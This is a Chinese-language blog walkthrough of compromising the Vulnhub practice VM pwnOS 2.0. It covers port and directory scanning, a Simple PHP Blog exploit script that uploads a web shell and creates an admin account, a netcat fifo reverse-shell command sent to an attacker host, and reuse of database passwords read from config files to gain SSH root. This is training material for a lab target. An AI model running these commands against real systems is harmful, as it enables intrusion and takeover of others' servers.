---
title: Vulnhub-PWNOS2.0 
date: 2024-02-20 
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Pwnos2.html"
---

# PWNOS2.0

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401091.png" alt="image-20240220103740848" style="zoom:50%;" />

打开虚拟机压缩包，查看一下文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401092.png" alt="image-20240220104015340" style="zoom:50%;" />

打开靶机看一下，按照要求改一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401093.png" alt="image-20240220105926050" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401094.png" alt="image-20240220110215913" style="zoom:50%;" />

后来又换成了nat模式：

```bash
nmap -sn 10.10.10.0/24
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401095.png" alt="image-20240220110747048" style="zoom:50%;" />

找到目标主机了，可以开始攻击辣！

## 信息搜集

### 端口扫描

```shell
nmap --min-rate 8888 -p- 10.10.10.100
nmap -p 22,80 -Pn -sV 10.10.10.100
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401096.png" alt="image-20240220110959128" style="zoom:50%;" />

### 80端口访问

![image-20240220111348751](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401097.png)

### wappalyzer插件

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401098.png" alt="image-20240220111412077" style="zoom:50%;" />

### 目录扫描

```shell
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.100 -f -t 200
```

![image-20240220111609734](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401099.png)

## 漏洞利用

### sql 

扫描出目录以后访问一下，找到`/login`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401100.png" alt="image-20240220112742159" style="zoom:50%;" />

尝试万能密码：

![image-20240220112904885](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401101.png)

嘶。。。。。



### blog exploit

找的时候发现了一个博客：

![image-20240220113107012](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401102.png)

查看一下源代码：

![image-20240220115147255](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401103.png)

也可以使用`whatweb`：

![image-20240220121842037](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401104.png)

发现了blog版本，查找一下相关漏洞：

![image-20240220115409707](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401105.png)

下载，并尝试运行一下：

```bash
searchsploit simple php blog 0.4.0 -m 1191.pl
```

> perl 1191.pl的时候遇到了报错：
>
> Can't locate Switch.pm in @INC (you may need to install the Switch module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.36.0 /usr/local/share/perl/5.36.0 /usr/lib/x86_64-linux-gnu/perl5/5.36 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl-base /usr/lib/x86_64-linux-gnu/perl/5.36 /usr/share/perl/5.36 /usr/local/lib/site_perl) at 1191.pl line 146.
> BEGIN failed--compilation aborted at 1191.pl line 146.
>
> Solution: sudo apt-get install libswitch-perl

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401106.png" alt="image-20240220120124718" style="zoom:50%;" />

尝试利用：

```shell
perl 1191.pl -h http://10.10.10.100/blog -e 2 
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401107.png" alt="image-20240220120227838" style="zoom:50%;" />

获取到了hash，但是是个被md5加密过的。。。。

尝试脚本的其他选项：

#### -e 1 上传cmd.php

```shell
perl 1191.pl -h http://10.10.10.100/blog -e 1
curl "http://10.10.10.100/blog/images/cmd.php?cmd=ls+-la"
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401108.png" alt="image-20240220120932582" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401109.png" alt="image-20240220120943467" style="zoom:50%;" />

然后我们可以尝试连接一下：

```shell
curl "http://10.10.10.100/blog/images/cmd.php?cmd=nc+-h+2>%261"
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401110.png" alt="image-20240220121301619" style="zoom:50%;" />

可以看到是`OpenBSD netcat`，尝试反向连接：

```bash
# rm /tmp/f;mkfifo /tmp/f;/bin/sh -i 2>&1 </tmp/f|nc $HOST $PORT >/tmp/f
rm /tmp/f;mkfifo /tmp/f;/bin/sh -i 2>&1 </tmp/f|nc 10.10.10.128 1234 >/tmp/f
curl "http://10.10.10.100/blog/images/cmd.php?cmd=rm+/tmp/f;mkfifo+/tmp/f;bash</tmp/f|nc+10.10.10.128+1234>/tmp/f+2>%261"
# kali
nc -lvnp 1234
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401111.png" alt="image-20240220122608997" style="zoom:50%;" />

获取到了！

#### -e 3 创建用户

```bash
perl 1191.pl -h http://10.10.10.100/blog -e 3 -U admin -P password
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401112.png" alt="image-20240220133443687" style="zoom:50%;" />

登陆一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401113.png" alt="image-20240220133535620" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401114.png" alt="image-20240220133551833" style="zoom:50%;" />

登录成功了，尝试上传一个文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401116.png" alt="image-20240220134734699" style="zoom:50%;" />

访问一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401117.png" alt="image-20240220134815196" style="zoom:50%;" />

上传成功了！！监听再访问即可获取shell！

![image-20240220135204201](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401118.png)

`sudo -l`不知道密码，执行不了。

## 提权

```shell
cd /var/www
ls -l
# total 36                                                                                   
# -rw-r--r--  1 root root 1374 Mar 24  2008 activate.php                                     
# drwxrwxrwx 11 root root 4096 May  9  2011 blog                                             
# drwxr-xr-x  2 root root 4096 May  7  2011 includes                                         
# -rw-r--r--  1 root root  629 May  7  2011 index.php                                        
# -rw-r--r--  1 root root   23 Apr  3  2008 info.php                                         
# -rw-r--r--  1 root root 3091 May  7  2011 login.php                                         
# -rw-r--r--  1 root root  516 Apr  2  2008 mysqli_connect.php
# -rw-r--r--  1 root root 4618 Apr  2  2008 register.php 
```

```php
# cat mysqli_connect.php
<?php # Script 8.2 - mysqli_connect.php                                                                         

// This file contains the database access information.
// This file also establishes a connection to MySQL
// and selects the database.

// Set the database access information as constants:

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'goodday');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');

// Make the connection:

$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );

?>
```

获取到了数据库的用户与密码！！！但是我一进行mysql相关命令就会卡死，不知道为啥，只能尝试一下ssh连接了。。。。

```shell
ssh root@10.10.10.100
goodday
```

![image-20240220124730394](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401119.png)

密码不正确，再找一下其他的：

```shell
find / -name 'mysqli_connect.php' 2>/dev/null
# /var/mysqli_connect.php
# /var/www/mysqli_connect.php
```

```php
# cat /var/mysqli_connect.php
<?php # Script 8.2 - mysqli_connect.php

// This file contains the database access information.
// This file also establishes a connection to MySQL
// and selects the database.

// Set the database access information as constants:

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'root@ISIntS');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');

// Make the connection:

$dbc = @mysqli_connect (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) OR die ('Could not connect to MySQL: ' . mysqli_connect_error() );

?>
```

又得到一个用户名，尝试登录：

![image-20240220124806742](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402201401120.png)

获取到了root权限！